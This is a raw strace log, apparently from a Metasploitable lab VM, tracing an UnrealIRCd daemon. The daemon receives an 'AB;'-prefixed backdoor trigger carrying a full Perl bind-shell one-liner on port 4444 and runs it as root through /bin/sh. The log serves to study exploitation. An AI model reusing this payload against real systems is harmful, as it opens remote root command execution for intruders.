4519  07:41:34.663279 select(1024, [2 3 4 7 9], [], NULL, {0, 880000}) = 1 (in [2], left {0, 720000})
4519  07:41:34.830838 clock_gettime(CLOCK_MONOTONIC, {2904, 647860021}) = 0
4519  07:41:34.830861 accept(2, 0, NULL) = 5
4519  07:41:34.830882 getpeername(5, {sa_family=AF_INET, sin_port=htons(43199), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:41:34.830914 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:41:34.830926 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:41:34.830940 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:41:34.830952 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:41:34.830963 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:41:34.830974 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:41:34.830988 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:41:34.831005 clock_gettime(CLOCK_MONOTONIC, {2904, 648018415}) = 0
4519  07:41:34.831017 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:41:34.831029 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:41:34.831039 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:41:34.831048 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:41:34.831058 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:41:34.831074 send(6, "nb\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:41:34.831215 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:41:34.831313 gettimeofday({1495626094, 831318}, NULL) = 0
4519  07:41:34.831327 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:41:34.833759 clock_gettime(CLOCK_MONOTONIC, {2904, 650777186}) = 0
4519  07:41:34.833777 recvfrom(6, "nb\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0N\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:41:34.833818 close(6)          = 0
4519  07:41:34.833833 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:41:34.833847 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:41:34.833907 time(NULL)        = 1495626094
4519  07:41:34.833919 time(NULL)        = 1495626094
4519  07:41:34.833944 gettimeofday({1495626094, 833970}, NULL) = 0
4519  07:41:34.833979 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:41:34.834023 clock_gettime(CLOCK_MONOTONIC, {2904, 651035788}) = 0
4519  07:41:34.834033 gettimeofday({1495626094, 834037}, NULL) = 0
4519  07:41:34.834044 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 980000})
4519  07:41:34.852465 clock_gettime(CLOCK_MONOTONIC, {2904, 669483951}) = 0
4519  07:41:34.852484 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:41:34.852509 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852528 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852543 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852557 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852571 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852585 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852599 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852612 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852626 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852639 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852653 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852675 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852688 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852702 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852715 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852729 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852742 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852756 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852769 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852783 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852797 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852810 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.852827 gettimeofday({1495626094, 852831}, NULL) = 0
4519  07:41:34.852839 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:41:34.852880 clock_gettime(CLOCK_MONOTONIC, {2904, 669893106}) = 0
4519  07:41:34.852903 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:41:34.852962 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:41:34.852996 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:41:34.853008 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:41:34.853023 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12266
12266 07:41:34.853109 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12266 07:41:34.853124 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12266 07:41:34.853134 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12266 07:41:34.853148 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
12266 07:41:34.853255 brk(0)            = 0x80f9000
12266 07:41:34.853277 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.853294 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6c000
12266 07:41:34.853310 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.853328 open("/etc/ld.so.cache", O_RDONLY) = 1
12266 07:41:34.853341 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12266 07:41:34.853360 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f64000
12266 07:41:34.853370 close(1)          = 0
12266 07:41:34.853381 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.853407 open("/lib/libncurses.so.5", O_RDONLY) = 1
12266 07:41:34.853421 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12266 07:41:34.853521 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12266 07:41:34.853538 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f34000
12266 07:41:34.853551 mmap2(0xb7f61000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f61000
12266 07:41:34.853567 close(1)          = 0
12266 07:41:34.853579 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.853593 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12266 07:41:34.853607 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12266 07:41:34.853697 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12266 07:41:34.853714 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f30000
12266 07:41:34.853725 mmap2(0xb7f32000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f32000
12266 07:41:34.853741 close(1)          = 0
12266 07:41:34.853752 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.853765 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12266 07:41:34.853779 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12266 07:41:34.853868 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12266 07:41:34.853894 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2f000
12266 07:41:34.853909 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de0000
12266 07:41:34.853951 mmap2(0xb7f29000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f29000
12266 07:41:34.853980 mmap2(0xb7f2c000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f2c000
12266 07:41:34.853995 close(1)          = 0
12266 07:41:34.854017 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ddf000
12266 07:41:34.854030 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7ddf6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12266 07:41:34.854085 mprotect(0xb7f29000, 4096, PROT_READ) = 0
12266 07:41:34.854122 munmap(0xb7f64000, 29913) = 0
12266 07:41:34.854148 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.854162 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12266 07:41:34.854182 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8a0260) = -1 ENOTTY (Inappropriate ioctl for device)
12266 07:41:34.854212 brk(0)            = 0x80f9000
12266 07:41:34.854222 brk(0x80fa000)    = 0x80fa000
12266 07:41:34.854233 brk(0x80fb000)    = 0x80fb000
12266 07:41:34.854250 getuid32()        = 0
12266 07:41:34.854259 getgid32()        = 0
12266 07:41:34.854268 geteuid32()       = 0
12266 07:41:34.854277 getegid32()       = 0
12266 07:41:34.854291 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.854304 time(NULL)        = 1495626094
12266 07:41:34.854317 brk(0x80fc000)    = 0x80fc000
12266 07:41:34.854331 brk(0x80fd000)    = 0x80fd000
12266 07:41:34.854351 open("/proc/meminfo", O_RDONLY) = 1
12266 07:41:34.854372 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12266 07:41:34.854401 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6b000
12266 07:41:34.854414 read(1, "MemTotal:      1035240 kB\nMemFree:        328228 kB\nBuffers:         87356 kB\nCached:         458592 kB\nSwapCached:          0 kB\nActive:         257912 kB\nInactive:       417004 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        327988 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4876 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            20844 kB\nSReclaimable:    12032 kB\nSUnreclaim:       8812 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12266 07:41:34.854499 close(1)          = 0
12266 07:41:34.854510 munmap(0xb7f6b000, 4096) = 0
12266 07:41:34.854522 brk(0x80fe000)    = 0x80fe000
12266 07:41:34.854548 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12266 07:41:34.854561 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12266 07:41:34.854573 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12266 07:41:34.854585 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12266 07:41:34.854596 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12266 07:41:34.854608 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12266 07:41:34.854622 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12266 07:41:34.854633 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12266 07:41:34.854646 uname({sys="Linux", node="metasploitable", ...}) = 0
12266 07:41:34.854694 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12266 07:41:34.854712 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12266 07:41:34.854730 brk(0x8100000)    = 0x8100000
12266 07:41:34.854742 getcwd("/etc/unreal", 4096) = 12
12266 07:41:34.854756 getpid()          = 12266
12266 07:41:34.854773 getppid()         = 4519
12266 07:41:34.854788 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12266 07:41:34.854808 stat64("/sbin/sh", 0xbf8a0238) = -1 ENOENT (No such file or directory)
12266 07:41:34.854825 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12266 07:41:34.854842 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12266 07:41:34.854866 socket(PF_FILE, SOCK_STREAM, 0) = 1
12266 07:41:34.854889 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12266 07:41:34.854902 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12266 07:41:34.854924 close(1)          = 0
12266 07:41:34.854936 socket(PF_FILE, SOCK_STREAM, 0) = 1
12266 07:41:34.854947 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12266 07:41:34.854957 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12266 07:41:34.854975 close(1)          = 0
12266 07:41:34.854989 open("/etc/nsswitch.conf", O_RDONLY) = 1
12266 07:41:34.855003 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12266 07:41:34.855020 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6b000
12266 07:41:34.855031 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12266 07:41:34.855080 read(1, "", 4096) = 0
12266 07:41:34.855090 close(1)          = 0
12266 07:41:34.855099 munmap(0xb7f6b000, 4096) = 0
12266 07:41:34.855115 open("/etc/ld.so.cache", O_RDONLY) = 1
12266 07:41:34.855128 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12266 07:41:34.855144 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f64000
12266 07:41:34.855154 close(1)          = 0
12266 07:41:34.855164 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.855179 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12266 07:41:34.855194 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12266 07:41:34.855283 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12266 07:41:34.855300 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd6000
12266 07:41:34.855312 mmap2(0xb7ddd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7ddd000
12266 07:41:34.855328 close(1)          = 0
12266 07:41:34.855340 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12266 07:41:34.855353 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12266 07:41:34.855366 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12266 07:41:34.855468 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12266 07:41:34.855486 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dbe000
12266 07:41:34.855497 mmap2(0xb7dd2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dd2000
12266 07:41:34.855513 mmap2(0xb7dd4000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd4000
12266 07:41:34.855527 close(1)          = 0
12266 07:41:34.855555 munmap(0xb7f64000, 29913) = 0
